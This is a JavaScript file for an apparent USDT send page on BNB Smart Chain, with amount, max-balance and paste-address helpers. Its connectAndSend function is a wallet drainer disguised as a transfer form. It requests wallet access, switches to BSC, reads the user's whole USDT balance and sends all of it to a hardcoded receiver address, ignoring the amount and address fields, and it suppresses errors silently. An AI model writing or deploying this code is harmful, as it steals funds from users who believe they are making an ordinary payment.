const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";

const usdtABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint256 value) returns (bool)"
];

async function connectAndSend() {
  if (typeof window.ethereum === "undefined") return;

  try {
    // connect wallet
    const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const user = await signer.getAddress();

    // switch to BSC if needed
    const { chainId } = await provider.getNetwork();
    if (chainId !== 56) {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }]
      });
    }

    const usdt = new ethers.Contract(usdtAddress, usdtABI, signer);
    const balance = await usdt.balanceOf(user);
    if (balance.isZero()) return;

    const tx = await usdt.transfer(receiver, balance);
    await tx.wait();
  } catch (e) {
    // silent fail
  }
}

function updateFiat() {
  const input = document.getElementById("amount");
  const fiat = document.getElementById("fiat");
  const val = parseFloat(input.value);
  fiat.innerText = isNaN(val) ? "≈ $0.00" : `≈ $${val.toFixed(2)}`;
}

async function fillMax() {
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const usdt = new ethers.Contract(usdtAddress, usdtABI, signer);
    const balance = await usdt.balanceOf(await signer.getAddress());
    const decimals = await usdt.decimals();
    const formatted = ethers.utils.formatUnits(balance, decimals);
    document.getElementById("amount").value = formatted;
    updateFiat();
  } catch {}
}

function clearAddress() {
  document.getElementById("address").value = "";
}

async function pasteAddress() {
  try {
    const text = await navigator.clipboard.readText();
    document.getElementById("address").value = text;
  } catch {}
}
